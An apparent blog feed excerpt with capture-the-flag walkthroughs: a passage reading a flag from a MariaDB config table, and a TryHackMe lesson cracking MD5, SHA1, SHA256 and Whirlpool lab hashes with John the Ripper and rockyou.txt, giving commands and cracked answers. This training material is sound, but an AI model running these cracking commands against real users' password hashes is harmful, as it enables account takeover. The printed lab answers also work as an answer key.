</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">+</span><span style="color:#6c7086;font-style:italic">---------------+
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#89dceb;font-weight:bold">|</span> config        <span style="color:#89dceb;font-weight:bold">|</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">|</span> users         <span style="color:#89dceb;font-weight:bold">|</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">+</span><span style="color:#6c7086;font-style:italic">---------------+
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#fab387">2</span> <span style="color:#cba6f7">rows</span> <span style="color:#cba6f7">in</span> <span style="color:#cba6f7">set</span> (<span style="color:#fab387">0</span>.<span style="color:#fab387">009</span> sec)</span></span></code></pre></div>
<br>
<p>To list everything in the config table, I ran <code>show * from config</code> and there was the flag.
<br></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>MariaDB [htb]<span style="color:#89dceb;font-weight:bold">&gt;</span> <span style="color:#cba6f7">select</span> <span style="color:#89dceb;font-weight:bold">*</span> <span style="color:#cba6f7">from</span> config;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span><span style="color:#89dceb;font-weight:bold">+</span><span style="color:#6c7086;font-style:italic">----+-----------------------+----------------------------------+
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#89dceb;font-weight:bold">|</span> id <span style="color:#89dceb;font-weight:bold">|</span> name <span style="color:#89dceb;font-weight:bold">|</span> value <span style="color:#89dceb;font-weight:bold">|</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#89dceb;font-weight:bold">+</span><span style="color:#6c7086;font-style:italic">----+-----------------------+----------------------------------+
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#fab387">1</span> <span style="color:#89dceb;font-weight:bold">|</span> timeout <span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#fab387">60</span>s <span style="color:#89dceb;font-weight:bold">|</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#fab387">2</span> <span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#cba6f7">security</span> <span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#cba6f7">default</span> <span style="color:#89dceb;font-weight:bold">|</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#fab387">3</span> <span style="color:#89dceb;font-weight:bold">|</span> auto_logon <span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#cba6f7">false</span> <span style="color:#89dceb;font-weight:bold">|</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#fab387">4</span> <span style="color:#89dceb;font-weight:bold">|</span> max_size <span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#fab387">2</span>M <span style="color:#89dceb;font-weight:bold">|</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#fab387">5</span> <span style="color:#89dceb;font-weight:bold">|</span> flag <span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#fab387">7</span>b4bec00d1a39e3dd4e021ec3d915da8 <span style="color:#89dceb;font-weight:bold">|</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#fab387">6</span> <span style="color:#89dceb;font-weight:bold">|</span> enable_uploads <span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#cba6f7">false</span> <span style="color:#89dceb;font-weight:bold">|</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">|</span> <span style="color:#fab387">7</span> <span style="color:#89dceb;font-weight:bold">|</span> authentication_method <span style="color:#89dceb;font-weight:bold">|</span> radius <span style="color:#89dceb;font-weight:bold">|</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">+</span><span style="color:#6c7086;font-style:italic">----+-----------------------+----------------------------------+
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#fab387">7</span> <span style="color:#cba6f7">rows</span> <span style="color:#cba6f7">in</span> <span style="color:#cba6f7">set</span> (<span style="color:#fab387">0</span>.<span style="color:#fab387">009</span> sec)</span></span></code></pre></div>
<br>
<p><img src="image-1.png#center" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[THM] John The Ripper</title>
      <link>http://localhost:1313/thm-john-the-ripper/</link>
      <pubDate>Fri, 12 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/thm-john-the-ripper/</guid>
      <description>What are Hashes? A hash is a way of taking a piece of data any length and representing it in another form that is a fixed length. This masks the original value of the data. This is done by running the original through a hashing algorithm.
What makes Hashes secure? Hashing functions are designed as one-way functions. It&amp;rsquo;s easy to calculate the vash value of a given input; however, it is very difficult to find the original input given the hash value.</description>
      <content:encoded><![CDATA[<h4 id="what-are-hashes">What are Hashes?</h4>
<p>A hash is a way of taking a piece of data any length and representing it in another form that is a fixed length. This masks the original value of the data. This is done by running the original through a hashing algorithm.</p>
<h4 id="what-makes-hashes-secure">What makes Hashes secure?</h4>
<p>Hashing functions are designed as one-way functions. It&rsquo;s easy to calculate the vash value of a given input; however, it is very difficult to find the original input given the hash value.</p>
<h4 id="wordlists">Wordlists</h4>
<p>In order to dictonary attack hashes, you need a list of words that you can hash and compare, this is called a <code>wordlist</code>. There are many different wordlists out there, a good collection to use can be found in the <code>SecLists</code> repository. On Parrot and Kali, you can find a series of amazing wordlists in the <code>/usr/share/wordlists</code> directory.</p>
<h4 id="john-basic-syntax">John Basic Syntax</h4>
<p><code>john [options] [path to file]</code>
<code>john</code>: invokes the John the Ripper program
<code>[path to file]</code>: The file containing the hash you&rsquo;re trying to crack, if it&rsquo;s in the same directory you won&rsquo;t need to name a path, just the file.</p>
<p>John has built-in features to detect what type of hash it&rsquo;s being given, and to select appropriate rules and format to crack it for you, however it can be unreliable but if you can&rsquo;t identify what hash type you&rsquo;re working with and just want to try cracking it, use the following syntax:</p>
<p><code>john --wordlist=[path to wordlist] [path to file]</code></p>
<p>Format-specific cracking
<code>john --format=[format] --wordlist=[path to wordlist] [path to file]</code></p>
<p>Now you know the syntax, modifiers, and methods to crck basic hashes, try it yourself! Download the attached.txt files.</p>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<h4 id="what-type-of-hash-is-hash1txt">What type of hash is hash1.txt?</h4>






<pre tabindex="0"><code>md5</code></pre>
<p>I used <code>hash-identifier</code>, a Python tool, to identify the hash type of the hash1.txt.
<img src="image-1.png#center" alt="alt text"></p>
<br>
<h4 id="what-is-the-cracked-value-of-hash1txt">What is the cracked value of hash1.txt?</h4>






<pre tabindex="0"><code>biscuit</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ john --format<span style="color:#89dceb;font-weight:bold">=</span>raw-md5 --wordlist<span style="color:#89dceb;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt first_task_hashes/hash1.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Using default input encoding: UTF-8
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Loaded <span style="color:#fab387">1</span> password <span style="color:#89dceb">hash</span> <span style="color:#89dceb;font-weight:bold">(</span>Raw-MD5 <span style="color:#89dceb;font-weight:bold">[</span>MD5 128/128 ASIMD 4x2<span style="color:#89dceb;font-weight:bold">])</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Warning: no OpenMP support <span style="color:#cba6f7">for</span> this <span style="color:#89dceb">hash</span> type, consider --fork<span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">2</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Press <span style="color:#a6e3a1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#cba6f7">for</span> status
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>biscuit          <span style="color:#89dceb;font-weight:bold">(</span>?<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>1g 0:00:00:00 DONE <span style="color:#89dceb;font-weight:bold">(</span>2024-07-12 12:43<span style="color:#89dceb;font-weight:bold">)</span> 100.0g/s 409600p/s 409600c/s 409600C/s slimshady..oooooo
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Use the <span style="color:#a6e3a1">&#34;--show --format=Raw-MD5&#34;</span> options to display all of the cracked passwords reliably
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Session completed.</span></span></code></pre></div>
<br>
<h4 id="what-type-of-hash-is-hash2txt">What type of hash is hash2.txt?</h4>






<pre tabindex="0"><code>sha1</code></pre>
<p><img src="image-2.png#center" alt="alt text"></p>
<br>
<h4 id="what-is-the-cracked-value-of-hash2txt">What is the cracked value of hash2.txt?</h4>






<pre tabindex="0"><code>kangeroo</code></pre>
<p><code>john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt first_task_hashes/hash2.txt</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ john --format<span style="color:#89dceb;font-weight:bold">=</span>raw-sha1 --wordlist<span style="color:#89dceb;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt first_task_hashes/hash2.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Using default input encoding: UTF-8
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Loaded <span style="color:#fab387">1</span> password <span style="color:#89dceb">hash</span> <span style="color:#89dceb;font-weight:bold">(</span>Raw-SHA1 <span style="color:#89dceb;font-weight:bold">[</span>SHA1 128/128 ASIMD 4x<span style="color:#89dceb;font-weight:bold">])</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Warning: no OpenMP support <span style="color:#cba6f7">for</span> this <span style="color:#89dceb">hash</span> type, consider --fork<span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">2</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Press <span style="color:#a6e3a1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#cba6f7">for</span> status
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>kangeroo         <span style="color:#89dceb;font-weight:bold">(</span>?<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>1g 0:00:00:00 DONE <span style="color:#89dceb;font-weight:bold">(</span>2024-07-12 12:46<span style="color:#89dceb;font-weight:bold">)</span> 100.0g/s 11714Kp/s 11714Kc/s 11714KC/s kanon..kalvin1
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Use the <span style="color:#a6e3a1">&#34;--show --format=Raw-SHA1&#34;</span> options to display all of the cracked passwords reliably
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Session completed.</span></span></code></pre></div>
<br>
<h4 id="what-type-of-hash-is-hash3txt">What type of hash is hash3.txt?</h4>






<pre tabindex="0"><code>sha256</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>HASH: D7F4D3CCEE7ACD3DD7FAD3AC2BE2AAE9C44F4E9B7FB802D73136D4C53920140A
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Possible Hashs:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> SHA-256
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Haval-256
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Least Possible Hashs:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> GOST R 34.11-94
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> RipeMD-256
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> SNEFRU-256
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> SHA-256<span style="color:#89dceb;font-weight:bold">(</span>HMAC<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Haval-256<span style="color:#89dceb;font-weight:bold">(</span>HMAC<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> RipeMD-256<span style="color:#89dceb;font-weight:bold">(</span>HMAC<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> SNEFRU-256<span style="color:#89dceb;font-weight:bold">(</span>HMAC<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> SHA-256<span style="color:#89dceb;font-weight:bold">(</span>md5<span style="color:#89dceb;font-weight:bold">(</span><span style="color:#f5e0dc">$pass</span><span style="color:#89dceb;font-weight:bold">))</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> SHA-256<span style="color:#89dceb;font-weight:bold">(</span>sha1<span style="color:#89dceb;font-weight:bold">(</span><span style="color:#f5e0dc">$pass</span><span style="color:#89dceb;font-weight:bold">))</span></span></span></code></pre></div>
<br>
<h4 id="what-is-the-cracked-value-of-hash3txt">What is the cracked value of hash3.txt?</h4>






<pre tabindex="0"><code>microphone</code></pre>
<p><code>john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt first_task_hashes/hash3.txt</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ john --format<span style="color:#89dceb;font-weight:bold">=</span>raw-sha256 --wordlist<span style="color:#89dceb;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt first_task_hashes/hash3.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Using default input encoding: UTF-8
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Loaded <span style="color:#fab387">1</span> password <span style="color:#89dceb">hash</span> <span style="color:#89dceb;font-weight:bold">(</span>Raw-SHA256 <span style="color:#89dceb;font-weight:bold">[</span>SHA256 128/128 ASIMD 4x<span style="color:#89dceb;font-weight:bold">])</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Warning: poor OpenMP scalability <span style="color:#cba6f7">for</span> this <span style="color:#89dceb">hash</span> type, consider --fork<span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">2</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Will run <span style="color:#fab387">2</span> OpenMP threads
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Press <span style="color:#a6e3a1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#cba6f7">for</span> status
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>microphone       <span style="color:#89dceb;font-weight:bold">(</span>?<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>1g 0:00:00:00 DONE <span style="color:#89dceb;font-weight:bold">(</span>2024-07-12 12:49<span style="color:#89dceb;font-weight:bold">)</span> 100.0g/s 8192Kp/s 8192Kc/s 8192KC/s ryanscott..janson
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Use the <span style="color:#a6e3a1">&#34;--show --format=Raw-SHA256&#34;</span> options to display all of the cracked passwords reliably
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Session completed.</span></span></code></pre></div>
<br>
<h4 id="what-type-of-hash-is-hash4txt">What type of hash is hash4.txt?</h4>






<pre tabindex="0"><code>Whirlpool</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>HASH: c5a60cc6bbba781c601c5402755ae1044bbf45b78d1183cbf2ca1c865b6c792cf3c6b87791344986c8a832a0f9ca8d0b4afd3d9421a149d57075e1b4e93f90bf
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>Possible Hashs:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> SHA-512
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Whirlpool
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>Least Possible Hashs:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> SHA-512<span style="color:#89dceb;font-weight:bold">(</span>HMAC<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">9</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Whirlpool<span style="color:#89dceb;font-weight:bold">(</span>HMAC<span style="color:#89dceb;font-weight:bold">)</span></span></span></code></pre></div>
<br>
<h4 id="what-is-the-cracked-value-of-hash4txt">What is the cracked value of hash4.txt?</h4>






<pre tabindex="0"><code>colossal</code></pre>
<p><code>john --format=whirlpool --wordlist=/usr/share/wordlists/rockyou.txt first_task_hashes/hash4.txt</code></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ john --format<span style="color:#89dceb;font-weight:bold">=</span>whirlpool --wordlist<span style="color:#89dceb;font-weight:bold">=</span>/usr/share/wordlists/rockyou.txt first_task_hashes/hash4.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Using default input encoding: UTF-8
